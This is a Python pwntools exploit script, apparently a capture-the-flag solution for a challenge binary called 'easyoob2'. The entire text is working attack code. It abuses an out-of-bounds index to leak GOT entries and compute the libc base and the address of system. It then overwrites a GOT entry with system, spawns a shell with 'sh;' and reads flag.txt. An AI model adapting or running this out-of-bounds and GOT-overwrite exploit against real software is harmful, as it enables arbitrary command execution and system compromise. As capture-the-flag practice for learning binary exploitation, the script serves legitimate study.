from pwn import *

r = process("./easyoob2")
# r = remote("localhost", 10526)

def leak(index):
    r.sendlineafter("\n> ", f"1 {index}")
    entry = r.recvline().split()
    print(entry)
    leaked = u32(entry[1].ljust(4, b"\x00")) << 32
    return leaked + int(entry[2]) + (1<<32)

def clearbuf():
    r.sendlineafter("\n> ", b"2 1 BBB 1234")

def write(index, val):
    clearbuf()
    PAYLOAD = b"2 " + str(index).encode() + b" " + p32(val >> 32).replace(b"\x00", b"") + b" " + str(val & 0xffffffff).encode()
    print(PAYLOAD)
    r.sendlineafter("\n> ", PAYLOAD)

pause()

SCANF_GOT = leak(-0xb)
print(f"SCANF_GOT: {SCANF_GOT:#x}")
PRINTF_GOT = leak(-0xd)
print(f"PRINTF_GOT: {PRINTF_GOT:#x}")

LIBC_BASE = SCANF_GOT - 0x66230
print(f"LIBC_BASE: {LIBC_BASE:#x}")

ONE_GADGET = LIBC_BASE + 0xe6c84
print(f"ONE_GADGET: {ONE_GADGET:#x}")

SYSTEM = LIBC_BASE + 0x55410
print(f"SYSTEM: {SYSTEM:#x}")

write(-0xf, SYSTEM)

sleep(0.1)
r.sendline("2 2 sh; 1234")
r.sendline("3 2")
r.sendline("cat flag.txt")
r.interactive()
